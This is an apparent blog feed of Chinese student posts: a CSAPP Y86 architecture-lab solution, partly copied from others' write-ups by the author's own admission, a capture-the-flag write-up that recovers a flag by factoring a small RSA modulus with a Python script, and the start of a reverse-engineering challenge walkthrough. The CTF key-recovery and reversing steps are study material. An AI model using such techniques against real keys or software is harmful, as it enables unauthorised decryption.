&#123; IIRMOVQ, IRMMOVQ, IMRMOVQ, IJXX, ICALL, IIADDQ &#125;;</span><br><span class="line"></span><br><span class="line">################ Decode Stage    ###################################</span><br><span class="line"></span><br><span class="line">## What <span class="keyword">register</span> should be used as the A source?</span><br><span class="line">word srcA = [</span><br><span class="line">icode in &#123; IRRMOVQ, IRMMOVQ, IOPQ, IPUSHQ  &#125; : rA;</span><br><span class="line">icode in &#123; IPOPQ, IRET &#125; : RRSP;</span><br><span class="line"><span class="number">1</span> : RNONE; # Don<span class="number">&#x27;</span>t need <span class="keyword">register</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## What <span class="keyword">register</span> should be used as the B source?</span><br><span class="line">word srcB = [</span><br><span class="line">icode in &#123; IOPQ, IRMMOVQ, IMRMOVQ, IIADDQ  &#125; : rB;</span><br><span class="line">icode in &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : RRSP;</span><br><span class="line"><span class="number">1</span> : RNONE;  # Don<span class="number">&#x27;</span>t need <span class="keyword">register</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## What <span class="keyword">register</span> should be used as the E destination?</span><br><span class="line">word dstE = [</span><br><span class="line">icode in &#123; IRRMOVQ &#125; &amp;&amp; Cnd : rB;</span><br><span class="line">icode in &#123; IIRMOVQ, IOPQ, IIADDQ&#125; : rB;</span><br><span class="line">icode in &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : RRSP;</span><br><span class="line"><span class="number">1</span> : RNONE;  # Don<span class="number">&#x27;</span>t write any <span class="keyword">register</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## What <span class="keyword">register</span> should be used as the M destination?</span><br><span class="line">word dstM = [</span><br><span class="line">icode in &#123; IMRMOVQ, IPOPQ &#125; : rA;</span><br><span class="line"><span class="number">1</span> : RNONE;  # Don<span class="number">&#x27;</span>t write any <span class="keyword">register</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">################ Execute Stage   ###################################</span><br><span class="line"></span><br><span class="line">## Select input A to ALU</span><br><span class="line">word aluA = [</span><br><span class="line">icode in &#123; IRRMOVQ, IOPQ &#125; : valA;</span><br><span class="line">icode in &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ &#125; : valC;</span><br><span class="line">icode in &#123; ICALL, IPUSHQ &#125; : <span class="number">-8</span>;</span><br><span class="line">icode in &#123; IRET, IPOPQ &#125; : <span class="number">8</span>;</span><br><span class="line"># Other instructions don<span class="number">&#x27;</span>t need ALU</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Select input B to ALU</span><br><span class="line">word aluB = [</span><br><span class="line">icode in &#123; IRMMOVQ, IMRMOVQ, IOPQ, ICALL, </span><br><span class="line">      IPUSHQ, IRET, IPOPQ, IIADDQ &#125; : valB;</span><br><span class="line">icode in &#123; IRRMOVQ, IIRMOVQ &#125; : <span class="number">0</span>;</span><br><span class="line"># Other instructions don<span class="number">&#x27;</span>t need ALU</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Set the ALU function</span><br><span class="line">word alufun = [</span><br><span class="line">icode == IOPQ : ifun;</span><br><span class="line"><span class="number">1</span> : ALUADD;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Should the condition codes be updated?</span><br><span class="line">+<span class="keyword">bool</span> set_cc = icode in &#123; IOPQ, IIADDQ &#125;;</span><br><span class="line"></span><br><span class="line">################ Memory Stage    ###################################</span><br><span class="line"></span><br><span class="line">## Set read control signal</span><br><span class="line"><span class="keyword">bool</span> mem_read = icode in &#123; IMRMOVQ, IPOPQ, IRET &#125;;</span><br><span class="line"></span><br><span class="line">## Set write control signal</span><br><span class="line"><span class="keyword">bool</span> mem_write = icode in &#123; IRMMOVQ, IPUSHQ, ICALL &#125;;</span><br><span class="line"></span><br><span class="line">## Select memory address</span><br><span class="line">word mem_addr = [</span><br><span class="line">icode in &#123; IRMMOVQ, IPUSHQ, ICALL, IMRMOVQ &#125; : valE;</span><br><span class="line">icode in &#123; IPOPQ, IRET &#125; : valA;</span><br><span class="line"># Other instructions don<span class="number">&#x27;</span>t need address</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Select memory input data</span><br><span class="line">word mem_data = [</span><br><span class="line"># Value from <span class="keyword">register</span></span><br><span class="line">icode in &#123; IRMMOVQ, IPUSHQ &#125; : valA;</span><br><span class="line"># Return PC</span><br><span class="line">icode == ICALL : valP;</span><br><span class="line"># Default: Don<span class="number">&#x27;</span>t write anything</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Determine instruction status</span><br><span class="line">word Stat = [</span><br><span class="line">imem_error || dmem_error : SADR;</span><br><span class="line">!instr_valid: SINS;</span><br><span class="line">icode == IHALT : SHLT;</span><br><span class="line"><span class="number">1</span> : SAOK;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">################ Program Counter Update ############################</span><br><span class="line"></span><br><span class="line">## What address should instruction be fetched at</span><br><span class="line"></span><br><span class="line">word new_pc = [</span><br><span class="line"># Call.  Use instruction constant</span><br><span class="line">icode == ICALL : valC;</span><br><span class="line"># Taken branch.  Use instruction constant</span><br><span class="line">icode == IJXX &amp;&amp; Cnd : valC;</span><br><span class="line"># Completion of RET instruction.  Use value from <span class="built_in">stack</span></span><br><span class="line">icode == IRET : valM;</span><br><span class="line"># Default: Use incremented PC</span><br><span class="line"><span class="number">1</span> : valP;</span><br><span class="line">];</span><br><span class="line">#<span class="comment">/* $end seq-all-hcl */</span></span><br></pre></td></tr></table></figure><p>PS:咱这个实验没有自己作过，上面的修改方式参照了别的师傅的wp，然后我其实突然发现我直接测评也是直接满掉的，不知道为啥，所以这个还是不能算我自己写的，我也是真不会，我也不知道哪里需要添加，为什么以及它工作的原理是真的不知道，以后变强了看看这里能不能更新一下解决这个问题吧。<code>qwq</code></p><p><img src="https://i.loli.net/2021/05/11/dsAba43ELxCyrSl.png" alt="archlab_PartB_1.png"></p><h1 id="Part-C"><a href="#Part-C" class="headerlink" title="Part C"></a>Part C</h1><p>Part C在寒假的逆向培训中我还是记得很清楚的，循环次数缩减可以用每次移动八个字节，循环执行[len/8]次，然后再一字节一字节移动len%8次，利用这个思路去优化memcpy函数来着的。</p><p><img src="https://i.loli.net/2021/05/11/mqklds3JaxiROow.png" alt="archlab_PartC_2.png"></p><p>然后写出优化的思路：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"># You can modify this portion</span><br><span class="line"># Loop header</span><br><span class="line">xorq %rax,%rax# count = 0;</span><br><span class="line">iaddq $-4, %rdx</span><br><span class="line">jle EQ0</span><br><span class="line"></span><br><span class="line">Npos0:</span><br><span class="line">mrmovq (%rdi), %r10</span><br><span class="line">mrmovq 8(%rdi), %r11</span><br><span class="line">mrmovq 16(%rdi), %r12</span><br><span class="line">mrmovq 24(%rdi), %r13</span><br><span class="line">mrmovq 32(%rdi), %r14</span><br><span class="line">rmmovq %r10, (%rsi)</span><br><span class="line">andq %r10, %r10# val &lt;= 0?</span><br><span class="line">    jle Npos1</span><br><span class="line">    iaddq $1, %rax</span><br><span class="line"></span><br><span class="line">Npos1:</span><br><span class="line">rmmovq %r11, 8(%rsi)</span><br><span class="line">andq %r11, %r11# val &lt;= 0?</span><br><span class="line">    jle Npos2</span><br><span class="line">    iaddq $1, %rax</span><br><span class="line"></span><br><span class="line">Npos2:</span><br><span class="line">rmmovq %r12, 16(%rsi)</span><br><span class="line">andq %r12, %r12# val &lt;= 0?</span><br><span class="line">    jle Npos3</span><br><span class="line">    iaddq $1, %rax</span><br><span class="line"></span><br><span class="line">Npos3:</span><br><span class="line">rmmovq %r13, 24(%rsi)</span><br><span class="line">andq %r13, %r13# val &lt;= 0?</span><br><span class="line">    jle Npos4</span><br><span class="line">    iaddq $1, %rax</span><br><span class="line"></span><br><span class="line">Npos4:</span><br><span class="line">rmmovq %r14, 32(%rsi)</span><br><span class="line">andq %r14, %r14# val &lt;= 0?</span><br><span class="line">    jle Tail</span><br><span class="line">    iaddq $1, %rax</span><br><span class="line"></span><br><span class="line">Tail:</span><br><span class="line">iaddq $40, %rsi</span><br><span class="line">iaddq $40, %rdi</span><br><span class="line">iaddq $-5, %rdx</span><br><span class="line">    jg Npos0</span><br><span class="line"></span><br><span class="line">EQ0:</span><br><span class="line">    iaddq $4, %rdx</span><br><span class="line">    jle Done</span><br><span class="line">    mrmovq (%rdi), %r10</span><br><span class="line">    mrmovq 8(%rdi), %r11</span><br><span class="line">    rmmovq %r10, (%rsi)</span><br><span class="line">    andq %r10, %r10</span><br><span class="line">    jle EQ1</span><br><span class="line">    iaddq $1, %rax</span><br><span class="line"></span><br><span class="line">EQ1:</span><br><span class="line">    iaddq $-1, %rdx</span><br><span class="line">    jle Done</span><br><span class="line">    rmmovq %r11, 8(%rsi)</span><br><span class="line">    andq %r11, %r11</span><br><span class="line">    jle EQ2</span><br><span class="line">    iaddq $1, %rax</span><br><span class="line"></span><br><span class="line">EQ2:</span><br><span class="line">    iaddq $-1, %rdx</span><br><span class="line">    jle Done</span><br><span class="line">    mrmovq 16(%rdi), %r12</span><br><span class="line">    rmmovq %r12, 16(%rsi)</span><br><span class="line">    andq %r12, %r12</span><br><span class="line">    jle EQ3</span><br><span class="line">    iaddq $1, %rax</span><br><span class="line"></span><br><span class="line">EQ3:</span><br><span class="line">    iaddq $-1, %rdx</span><br><span class="line">    jle Done</span><br><span class="line">    mrmovq 24(%rdi), %r13</span><br><span class="line">    rmmovq %r13, 24(%rsi)</span><br><span class="line">    andq %r13, %r13</span><br><span class="line">    jle Done</span><br><span class="line">    iaddq $1, %rax</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/05/11/2ZdkDcsWQiEqRIx.png" alt="archlab_PartC_1.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;下载文件之后：&lt;/p&gt;
&lt;p&gt;脑瓜子嗡嗡的，&lt;code&gt;writeup&lt;/code&gt;看不懂，只能先去看看已有的实验报告，然后先做个总结——&lt;/p&gt;
&lt;p&gt;先把里面的&lt;code&gt;sim.tar&lt;/code&gt;解压了，然后进入目录之后&lt;code&gt;make clean&lt;/code&gt;，&lt;code&gt;make&lt;/code&gt;会在里面的所有文件该生成的文件生成了。&lt;/p&gt;</summary>
    
    
    
    <category term="csapp" scheme="http://example.com/categories/csapp/"/>
    
    <category term="lab" scheme="http://example.com/categories/csapp/lab/"/>
    
    
  </entry>
  
  <entry>
    <title>RSA解密</title>
    <link href="http://example.com/2021/05/08/RSA/"/>
    <id>http://example.com/2021/05/08/RSA/</id>
    <published>2021-05-08T02:00:00.000Z</published>
    <updated>2021-10-25T04:38:09.396Z</updated>
    
    <content type="html"><![CDATA[<p><code>RSA</code>解密简介:<code>RSA</code>是1977年由罗纳德·李维斯特（<code>Ron Rivest</code>）、阿迪·萨莫尔（<code>Adi Shamir</code>）和伦纳德·阿德曼（<code>Leonard Adleman</code>）一起提出的。当时他们三人都在麻省理工学院工作。<code>RSA</code>就是他们三人姓氏开头字母拼在一起组成的 。(from 百度百科)</p><span id="more"></span><h1 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h1><p>我们平时学习的加密多是对称加密，非对称加密相比于对称加密的区别就是:加密和解密用的不是同一个密钥。假如<code>Alice</code>和Bob想在一个不安全的线路上通信，他们在用这个信息交流之前没有任何py的信息(即:他们一开始不存在有且仅有他们两个人知道的信息)，而在这条线路上通信的所有信息都会被第三方窃听者Eve所获得。问:如何不让窃听者Eve监听到<code>Alice</code>和Bob的对话？</p><p>当然我们必须对发送的信息进行加密，而对称加密必须两人提前获取密钥和加密方式，这些信息都是他们一开始所不知道的，因此需要在这条线路上告知密钥和加密方式，如果在这条线路上告知，那么Eve也能对加密的数据解密从而监听他们的通话内容，那么我们采取非对称加密是最保险的。我只告诉你怎么加密，解密的密钥我自己留着，由于Eve不清楚解密方式自然就无法获取信息了。</p><h1 id="RSA加密"><a href="#RSA加密" class="headerlink" title="RSA加密"></a>RSA加密</h1><p>首先选取两个很大的质数<code>p</code>,<code>q</code>。</p><p>令<code>n=p*q</code>，任意选取一个很大的质数做公钥指数，那么<code>(n,e)</code>就形成了公钥，可以用它进行加密，假如明文为m，那么密文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plain</span><br><span class="line"></span><br><span class="line">c=m^e mod n</span><br></pre></td></tr></table></figure><p>我自己生成的p,q做运算<code>φ(n)=(p-1)(q-1)</code></p><p><code>d=inverse(e,φ(n))</code>，<code>inverse</code>函数为求模逆元函数</p><p><code>(n,d)</code>就是私钥，是只有我们自己知道的。</p><p>我拿到密文c后我可以用d还原明文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plain</span><br><span class="line"></span><br><span class="line">m=c^d mod n</span><br></pre></td></tr></table></figure><h1 id="RSA加密的破解"><a href="#RSA加密的破解" class="headerlink" title="RSA加密的破解"></a>RSA加密的破解</h1><p>破解的关键在于分解n的质因数，如果分解得到的p,q那么我们就很容易推得私钥d。</p><p>在应用当中，n一般有2048位，基本是破解不出的，而在比赛的时候n就只有不到百位，用一些在线工具也是很快可以破解得到p和q的。</p><p>但是拿到了一个很大位数的私钥d那也不顶用啊，算还是算不了啊，这个时候可以用第三方解密包RSA，也可以手写算法解决，作为一个ACMer，就得把珍藏已久的快速幂算法拿出来了，由于python支持大数，所以我会用python写。</p><h1 id="例题-SUCTF2019-SignIn"><a href="#例题-SUCTF2019-SignIn" class="headerlink" title="例题:[SUCTF2019]SignIn"></a>例题:[<a href="https://buuoj.cn/challenges#[SUCTF2019]SignIn">SUCTF2019]SignIn</a></h1><p>拿到elf文件先拖进IDA打开字符串窗口<code>(shift+F12)</code>，发现很容易看到字符串<code>[input flag]</code>，那么跟进去找到函数<code>main()</code></p><p><img src="https://i.loli.net/2021/05/07/q6bVAWsiu2m3SgT.png" alt="buuctf SignIn_1.png"></p><p>发现多了很多不认识的函数，但是根据它的参数也可以很容易发现这是个字符串赋值的函数，而且后面加了参数<code>10</code>或者<code>16</code>很像它的进制。后面的<code>GG</code>和<code>TTTTTTql!</code>肯定就是判断你输入的flag的正误了。</p><p>从头开始分析，输入的是v8字符串，v8经过了sub_96A函数的洗礼，跟进去看看逻辑关系。</p><p><img src="https://i.loli.net/2021/05/07/gmD4cXz23kZLVft.png" alt="buuctf SignIn_2.png"></p><p>很容易发现它是把a1字符串拆解成高字节和低字节分别存储到a2[i]和a2[i+1]，至于字符串byte_202010那就是很典型的16进制表<code>0123456789abcdef</code>，那么我输入的它给它拆成16进制数了，那么等会逆向解回去的话这个还是很好逆回去的，那么我们<code>ESC</code>跳回原来的函数。</p><p>v8的值转换给了v9，v7为下面比较字符串的其中一个，然后把v9转换成16进制数赋给v6，v5=65537。其实这个特征都就已经告诉你这是RSA解密。毕竟加密指数65537是十分常见的RSA加密指数。那么下面还有一个不认识的函数，不过看它的后缀powm，pow你就很容易看出来是取次方，然后m不就是模mod了么(手动滑稽)。所以这个函数实现的功能等价于一个表达式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v6=v6^v5%v4</span><br></pre></td></tr></table></figure><p>相当于v6是我们输入的，然后这个结果我们是知道的，模数n和指数e我们也知道，那么就对它结果(v7)进行RSA解密。</p><p>1.破解得到p,q，<a href="http://www.factordb.com/index.php">在线工具</a></p><p>2.编写脚本解密，这里用第三方包解密我就不演示了，主要看看解密的过程。</p><p>脚本中的数一律为10进制，转换的简单方法:把数复制到python交互窗口加上前缀<code>0x</code>就可以输出它的10进制数值了。</p><p><img src="https://i.loli.net/2021/05/07/nAc9TG5p4hDgrLq.png" alt="buuctf SignIn_3.png"></p><p>快速幂的脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">python</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">while(d):</span><br><span class="line">    if d&amp;1:</span><br><span class="line">        x=x*c%n</span><br><span class="line">    c=c*c%n</span><br><span class="line">    d=d//2</span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure><p>得到数值<code>185534734614696481020381637136165435809958101675798337848243069</code>。</p><p>这里还要转回16进制再被逆回去处理，因为它以开始也就是16进制的，我们还用python<code>hex(185534734614696481020381637136165435809958101675798337848243069)</code>得到16进制数。</p><p><img src="https://i.loli.net/2021/05/07/IzF89jYiTCL6bdp.png" alt="buuctf SignIn_4.png"></p><p>最后一步就可以写脚本做最后一步解密了，这一步很简单，就是16进制转字符串，这个我喜欢用C++写，我感觉会比较方便。</p><p><img src="https://i.loli.net/2021/05/07/OMTJFghtDpBrKan.png" alt="buuctf SignIn_5.png"></p><p>得到flag</p><p>本篇所有的exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">python</span><br><span class="line"></span><br><span class="line">#RSA解密脚本</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">p=282164587459512124844245113950593348271</span><br><span class="line">q=366669102002966856876605669837014229419</span><br><span class="line">phi=(p-1)*(q-1)</span><br><span class="line">e=65537</span><br><span class="line">d=inverse(e,phi)</span><br><span class="line">c=78510953323073667749065685964447569045476327122134491251061064910992472210485</span><br><span class="line">n=103461035900816914121390101299049044413950405173712170434161686539878160984549</span><br><span class="line">x=1</span><br><span class="line">while(d):</span><br><span class="line">    if d&amp;1:</span><br><span class="line">        x=x*c%n</span><br><span class="line">    c=c*c%n</span><br><span class="line">    d=d//2</span><br><span class="line">print(x)</span><br><span class="line">c++</span><br><span class="line"></span><br><span class="line">//hex2raw脚本</span><br><span class="line">#include&lt;bits/stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">//char s[100];</span><br><span class="line">char s[]=&quot;73756374667b50776e5f405f68756e647265645f79656172737d&quot;;</span><br><span class="line">int b=0;</span><br><span class="line">int main()&#123;</span><br><span class="line">for(int i=0;i&lt;strlen(s);i+=2)&#123;</span><br><span class="line">int x=0;</span><br><span class="line">if(s[i]&lt;=&#x27;9&#x27;)&#123;</span><br><span class="line">x=(s[i]-&#x27;0&#x27;)&lt;&lt;4;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">x=(s[i]-&#x27;a&#x27;+10)&lt;&lt;4;</span><br><span class="line">&#125;</span><br><span class="line">if(s[i+1]&lt;=&#x27;9&#x27;)&#123;</span><br><span class="line">x+=(s[i+1]-&#x27;0&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">x+=(s[i+1]-&#x27;a&#x27;+10);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;%c&quot;,x);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本作者也是没想到啊，学逆向要把加密看那么透的，当时学RSA偷懒了啊，所以导致昨天捡起又花了很多时间，不过也好，加深了我对RSA算法的印象。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;code&gt;RSA&lt;/code&gt;解密简介:&lt;code&gt;RSA&lt;/code&gt;是1977年由罗纳德·李维斯特（&lt;code&gt;Ron Rivest&lt;/code&gt;）、阿迪·萨莫尔（&lt;code&gt;Adi Shamir&lt;/code&gt;）和伦纳德·阿德曼（&lt;code&gt;Leonard Adleman&lt;/code&gt;）一起提出的。当时他们三人都在麻省理工学院工作。&lt;code&gt;RSA&lt;/code&gt;就是他们三人姓氏开头字母拼在一起组成的 。(from 百度百科)&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="crypto" scheme="http://example.com/categories/ctf/crypto/"/>
    
    
  </entry>
  
  <entry>
    <title>红帽杯2019 easyRe</title>
    <link href="http://example.com/2021/05/06/%E7%BA%A2%E5%B8%BD%E6%9D%AF2019%20Easyre%20wp/"/>
    <id>http://example.com/2021/05/06/%E7%BA%A2%E5%B8%BD%E6%9D%AF2019%20Easyre%20wp/</id>
    <published>2021-05-06T02:00:00.000Z</published>
    <updated>2021-10-25T04:32:54.331Z</updated>
    
    <content type="html"><![CDATA[<p><code>pwn</code>题做完<code>re</code>题当然也不能少，<code>buu</code>上除了那些水题，开始做一些带点技术含量的题目了。</p><span id="more"></span><p>红帽杯2019的<code>easyRE</code>上来就是<code>800KB</code>的<code>elf</code>文件，看起来就很有技术含量的样子。其实看到大文件不用怕，函数多也不用怕，因为需要分析的函数一定只有几个，如果你点进去调用了大部分你没见过的函数，还有十分复杂的<code>goto</code>关系，那么这个函数你可以直接当他不存在，这是我自己得到的一个结论，不一定对，但是可以应付大部分的题目。废话不多说进入正题：<a href="https://buuoj.cn/challenges#[2019%E7%BA%A2%E5%B8%BD%E6%9D%AF]easyRE">buuctf 2019红帽杯easyRE</a></p><p>所有二进制安全相关的题目字符串一定是切入点，因为它可读。做<code>pwn</code>题你就找<code>flag</code>，<code>bin/sh</code>，当然这是签到-难度的题目才会有的字符串。做逆向题的话，看到很长的64位或者65位大小写字母和数字和一些其它字符组成的表，那么直接考虑<code>base64</code>，然后就是一些带<code>flag</code>的字符串或者是什么<code>right</code>，<code>correct</code>，<code>congratulate</code>之类判断正误的话，那么多半也是以调用这个字符串的函数为中心去分析。好的，打开先看一下，看到有很多很多的函数，先不慌(实则慌的一批)，冷静地先摁一个<code>shift+F12</code>查看字符串。</p><p><img src="https://i.loli.net/2021/05/06/5bQk79uOfiWDAea.png" alt="buuoj 红帽杯2019 easyRE_1.png"></p><p>一眼就可以看道有一个经典的<code>base64</code>表，还有一句话<code>you found me</code>(你找到我了)，像极了<code>flag</code>跟我们的对话，那么话不多说，点进去找到这个函数看看到底在哪里发出了这样的感叹。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_4009C6</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-108h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+20h] [rbp-100h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+28h] [rbp-F8h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+30h] [rbp-F0h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+38h] [rbp-E8h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+40h] [rbp-E0h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+48h] [rbp-D8h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+50h] [rbp-D0h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+58h] [rbp-C8h]</span></span><br><span class="line">  <span class="keyword">char</span> v12[<span class="number">13</span>]; <span class="comment">// [rsp+60h] [rbp-C0h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v13[<span class="number">4</span>]; <span class="comment">// [rsp+6Dh] [rbp-B3h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v14[<span class="number">19</span>]; <span class="comment">// [rsp+71h] [rbp-AFh] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v15[<span class="number">32</span>]; <span class="comment">// [rsp+90h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [rsp+B0h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">char</span> v17; <span class="comment">// [rsp+B4h] [rbp-6Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v18[<span class="number">72</span>]; <span class="comment">// [rsp+C0h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v19; <span class="comment">// [rsp+108h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v19 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  qmemcpy(v12, <span class="string">&quot;Iodl&gt;Qnb(ocy&quot;</span>, <span class="number">12</span>);</span><br><span class="line">  v12[<span class="number">12</span>] = <span class="number">127</span>;</span><br><span class="line">  qmemcpy(v13, <span class="string">&quot;y.i&quot;</span>, <span class="number">3</span>);</span><br><span class="line">  v13[<span class="number">3</span>] = <span class="number">127</span>;</span><br><span class="line">  qmemcpy(v14, <span class="string">&quot;d`3w&#125;wek9&#123;iy=~yL@EC&quot;</span>, <span class="keyword">sizeof</span>(v14));</span><br><span class="line">  <span class="built_in">memset</span>(v15, <span class="number">0</span>, <span class="keyword">sizeof</span>(v15));</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = 